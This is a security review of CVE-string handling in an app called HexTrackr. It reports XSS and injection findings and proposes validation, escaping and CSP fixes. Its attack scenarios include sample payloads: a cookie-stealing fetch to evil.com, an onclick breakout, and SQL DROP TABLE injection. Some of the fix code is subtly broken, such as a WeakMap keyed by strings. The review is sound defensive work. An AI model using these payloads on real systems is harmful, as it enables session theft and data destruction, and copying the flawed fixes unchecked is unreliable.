# Security Review: CVE String Handling in HexTrackr

## Task T043 - CVE Link System Fix Security Analysis

**Review Date**: 2025-09-09  
**Reviewer**: Shemp (Security Analysis Stooge)  
**Task**: Security review of CVE string handling to prevent injection vectors  
**Spec**: 004-cve-link-system-fix

---

## Executive Summary

After comprehensive analysis of HexTrackr's CVE string handling implementation, I've identified several security concerns and opportunities for hardening. While the application has some security measures in place (DOMPurify, path validation), there are critical gaps in CVE string sanitization that could lead to XSS and injection vulnerabilities.

**Risk Level**: MEDIUM-HIGH  
**Immediate Action Required**: Yes

---

## 1. Critical Security Findings

### 1.1 Server-Side Vulnerabilities

#### A. Unsanitized CVE String Storage

**Location**: `/app/public/server.js` (Lines 248-262)

```javascript
// Current implementation - NO SANITIZATION
let cve = row["definition.cve"] || row["cve"] || row["CVE"] || "";
if (!cve && row["definition.name"]) {
    const cveMatch = row["definition.name"].match(/(CVE-\d{4}-\d+)/);
    cve = cveMatch ? cveMatch[1] : "";
}
// Direct storage without validation
mapped.cve = cve;
```

**Risk**: CVE strings from CSV imports are stored directly in the database without sanitization or validation.

**Attack Vector**: Malicious CSV files could inject:

- SQL injection payloads disguised as CVE IDs
- XSS payloads that execute when rendered in the frontend
- Command injection strings

#### B. Insufficient Input Validation

**Location**: Multiple database operations

```javascript
// Lines 1031-1032 - Direct insertion without parameterization validation
db.run(insertCurrent, [
    importId, currentDate, row.hostname, row.ip_address, row.cve,
    ...
]);
```

**Risk**: While SQLite uses parameterized queries (good), there's no application-level validation of CVE format.

### 1.2 Frontend Vulnerabilities

#### A. Unsafe HTML Generation with CVE Links

**Location**: `/app/public/scripts/shared/vulnerability-details-modal.js` (Lines 99-102)

```javascript
`<a href="#" class="text-primary text-decoration-none fw-bold" 
   onclick="vulnDetailsModal.lookupVulnerability('${vulnLink.id}')">${vulnLink.id}</a>`
```

**Risk**: Direct string interpolation of CVE IDs into HTML without escaping.

**Attack Vector**: If `vulnLink.id` contains:

```javascript
'); alert('XSS'); //
```

This would break out of the onclick handler and execute arbitrary JavaScript.

#### B. Unsafe URL Construction

**Location**: Multiple files

```javascript
// vulnerability-details-modal.js:821
url: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=${cve.trim()}`

// vulnerability-search.js:174
`https://cve.mitre.org/cgi-bin/cvename.cgi?name=${cveId.trim()}`
```

**Risk**: No URL encoding of CVE parameter could lead to:

- URL injection attacks
- Open redirect vulnerabilities
- Parameter pollution

#### C. Inconsistent DOMPurify Usage

**Finding**: DOMPurify is loaded but not consistently used for CVE rendering.

**Evidence**:

- `security.js` has DOMPurify helpers but they're not used for CVE links
- Direct innerHTML assignments in modal generation
- No sanitization in ag-grid cell renderers

### 1.3 Data Flow Vulnerabilities

#### A. Window Global Storage Pattern

**Location**: `/app/public/scripts/shared/ag-grid-responsive-config.js` (Lines 205-208)

```javascript
if (!window.vulnModalData) {
    window.vulnModalData = {};
}
window.vulnModalData[vulnDataId] = params.data;
```

**Risk**: Storing vulnerability data in global window object is accessible to any script, including potential XSS payloads.

---

## 2. Attack Scenarios

### Scenario 1: Malicious CSV Import

```csv
hostname,cve,severity
server1,"<script>alert('XSS')</script>",Critical
server2,"CVE-2023-1234'); DROP TABLE vulnerabilities; --",High
server3,"CVE-2023-5678' onclick='fetch(`https://evil.com/steal?c=${document.cookie}`)",Medium
```

### Scenario 2: URL Parameter Injection

```
CVE ID: CVE-2023-1234%26evil=payload%26
Results in: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1234&evil=payload&
```

### Scenario 3: Stored XSS via Database

1. Import malicious CVE via CSV
2. CVE stored in database
3. Every page load renders the XSS payload
4. Persistent attack affecting all users

---

## 3. Security Recommendations

### 3.1 Immediate Fixes (Critical)

#### A. Server-Side CVE Validation

```javascript
// Add to server.js
function validateAndSanitizeCVE(cveString) {
    if (!cveString) return "";
    
    // Strict CVE format validation
    const cvePattern = /^CVE-\d{4}-\d{4,}$/;
    const cleanCVE = cveString.trim().toUpperCase();
    
    if (!cvePattern.test(cleanCVE)) {
        console.warn(`Invalid CVE format rejected: ${cveString}`);
        return ""; // Reject invalid formats
    }
    
    return cleanCVE;
}

// Apply in mapVulnerabilityRow
mapped.cve = validateAndSanitizeCVE(cve);
```

#### B. Frontend HTML Escaping

```javascript
// Update vulnerability-details-modal.js
function renderCVELink(cve) {
    const escapedCVE = escapeHtml(cve);
    const encodedCVE = encodeURIComponent(cve);
    
    if (cve && cve.startsWith("CVE-")) {
        return DOMPurify.sanitize(`
            <a href="#" 
               class="text-primary text-decoration-none fw-bold"
               data-cve="${escapedCVE}"
               onclick="event.preventDefault(); vulnDetailsModal.lookupVulnerability(this.dataset.cve)">
               ${escapedCVE}
            </a>
        `);
    }
    return `<span class="fw-bold">${escapedCVE}</span>`;
}
```

#### C. URL Parameter Encoding

```javascript
// Safe URL construction
function buildCVELookupURL(cveId) {
    const validatedCVE = validateAndSanitizeCVE(cveId);
    if (!validatedCVE) return null;
    
    const baseURL = "https://cve.mitre.org/cgi-bin/cvename.cgi";
    const params = new URLSearchParams({ name: validatedCVE });
    return `${baseURL}?${params.toString()}`;
}
```

### 3.2 Medium Priority Improvements

#### A. Content Security Policy Headers

```javascript
// Add to server.js
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", 
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' cdn.jsdelivr.net cdnjs.cloudflare.com; " +
        "style-src 'self' 'unsafe-inline' cdn.jsdelivr.net; " +
        "connect-src 'self' cve.mitre.org nvd.nist.gov;"
    );
    next();
});
```

#### B. Input Validation Middleware

```javascript
// Add comprehensive validation layer
class VulnerabilityValidator {
    static validateCVE(cve) {
        // Multiple validation rules
        const rules = [
            { pattern: /^CVE-\d{4}-\d{4,}$/, message: "Invalid CVE format" },
            { maxLength: 20, message: "CVE ID too long" },
            { noSpecialChars: /^[A-Z0-9-]+$/, message: "Invalid characters" }
        ];
        
        for (const rule of rules) {
            if (rule.pattern && !rule.pattern.test(cve)) {
                throw new Error(rule.message);
            }
            if (rule.maxLength && cve.length > rule.maxLength) {
                throw new Error(rule.message);
            }
        }
        return true;
    }
}
```

#### C. Secure Modal Data Storage

```javascript
// Replace window.vulnModalData with WeakMap
const vulnModalDataStore = new WeakMap();
const vulnModalKeys = new Map();

function storeVulnData(key, data) {
    const token = crypto.randomUUID();
    const secureData = Object.freeze({ ...data });
    vulnModalKeys.set(key, token);
    vulnModalDataStore.set(token, secureData);
    return key;
}

function retrieveVulnData(key) {
    const token = vulnModalKeys.get(key);
    if (!token) return null;
    return vulnModalDataStore.get(token);
}
```

### 3.3 Long-term Enhancements

#### A. Implement CVE Enrichment Service

```javascript
// Centralized CVE validation and enrichment
class CVEService {
    static async validateAndEnrich(cveId) {
        // 1. Format validation
        const validated = validateAndSanitizeCVE(cveId);
        if (!validated) return null;
        
        // 2. Check against known CVE database
        const exists = await this.checkCVEExists(validated);
        if (!exists) {
            console.warn(`CVE ${validated} not found in database`);
        }
        
        // 3. Return enriched data
        return {
            id: validated,
            url: this.buildSecureURL(validated),
            verified: exists,
            sanitized: true
        };
    }
}
```

#### B. Implement Rate Limiting for CVE Lookups

```javascript
const cveLookupLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 10, // 10 lookups per minute
    message: "Too many CVE lookups, please try again later"
});

app.get("/api/cve/:id", cveLookupLimiter, (req, res) => {
    // Handle CVE lookup
});
```

#### C. Add Security Audit Logging

```javascript
class SecurityAudit {
    static logSuspiciousInput(type, value, source) {
        const entry = {
            timestamp: new Date().toISOString(),
            type: type,
            value: value.substring(0, 100), // Truncate for safety
            source: source,
            action: "rejected"
        };
        
        // Log to security audit table
        db.run("INSERT INTO security_audit_log (entry) VALUES (?)", 
            [JSON.stringify(entry)]);
    }
}
```

---

## 4. Testing Recommendations

### 4.1 Security Test Cases

```javascript
describe("CVE Security Tests", () => {
    test("Should reject XSS in CVE field", () => {
        const maliciousCVE = "<script>alert('XSS')</script>";
        const result = validateAndSanitizeCVE(maliciousCVE);
        expect(result).toBe("");
    });
    
    test("Should reject SQL injection in CVE", () => {
        const sqlInject = "CVE-2023-1234'; DROP TABLE--";
        const result = validateAndSanitizeCVE(sqlInject);
        expect(result).toBe("");
    });
    
    test("Should properly encode URL parameters", () => {
        const cve = "CVE-2023-1234";
        const url = buildCVELookupURL(cve);
        expect(url).not.toContain("&");
        expect(url).toContain("name=CVE-2023-1234");
    });
});
```

### 4.2 Penetration Testing Checklist

- [ ] Test CSV import with malicious CVE values
- [ ] Test XSS payloads in all CVE display locations
- [ ] Test URL injection in CVE lookup links
- [ ] Test for open redirects
- [ ] Test for SQL injection via CVE fields
- [ ] Test for command injection possibilities
- [ ] Verify CSP headers are enforced
- [ ] Test rate limiting on CVE lookups

---

## 5. Implementation Priority

### Phase 1: Critical (Implement Immediately)

1. Add CVE format validation in server.js
2. Implement HTML escaping for all CVE displays
3. Add URL parameter encoding

### Phase 2: Important (Within 1 Week)

1. Implement DOMPurify for all dynamic HTML
2. Add CSP headers
3. Create validation middleware

### Phase 3: Enhancement (Within 1 Month)

1. Implement CVE enrichment service
2. Add security audit logging
3. Comprehensive penetration testing

---

## 6. Code Examples

### Safe CVE Rendering Pattern

```javascript
// SAFE: Using data attributes and event delegation
function renderCVEBadge(cve) {
    const container = document.createElement('span');
    const validated = validateAndSanitizeCVE(cve);
    
    if (validated) {
        container.innerHTML = DOMPurify.sanitize(`
            <span class="cve-badge" data-cve="${escapeHtml(validated)}">
                ${escapeHtml(validated)}
            </span>
        `);
        
        container.querySelector('.cve-badge').addEventListener('click', (e) => {
            e.preventDefault();
            const cveId = e.target.dataset.cve;
            if (cveId) {
                window.open(buildCVELookupURL(cveId), '_blank');
            }
        });
    }
    
    return container;
}
```

### Database Query Safety

```javascript
// SAFE: Parameterized queries with validation
function insertVulnerability(vuln) {
    const validatedCVE = validateAndSanitizeCVE(vuln.cve);
    
    return new Promise((resolve, reject) => {
        db.run(
            "INSERT INTO vulnerabilities (cve, severity) VALUES (?, ?)",
            [validatedCVE, vuln.severity],
            (err) => {
                if (err) {
                    SecurityAudit.logSuspiciousInput('cve', vuln.cve, 'import');
                    reject(err);
                } else {
                    resolve();
                }
            }
        );
    });
}
```

---

## 7. Conclusion

The current CVE handling implementation in HexTrackr has significant security vulnerabilities that need immediate attention. The lack of consistent input validation and output encoding creates multiple attack vectors for XSS and injection attacks.

**Most Critical Issues**:

1. No CVE format validation on import
2. Unsafe HTML generation with user-controlled data
3. Unencoded URL parameters
4. Inconsistent use of security libraries (DOMPurify)

**Recommended Immediate Actions**:

1. Implement strict CVE validation regex
2. Apply HTML escaping to all CVE displays
3. Use URL encoding for all external links
4. Enforce DOMPurify usage consistently

By implementing the recommended security measures, HexTrackr can significantly reduce its attack surface and protect against common web vulnerabilities.

---

**Security Review Complete**  
**Next Steps**: Implement Phase 1 critical fixes immediately

*"Heyyy, I found some security issues those knuckleheads missed! Better fix 'em before someone exploits these vulnerabilities!"* - Shemp
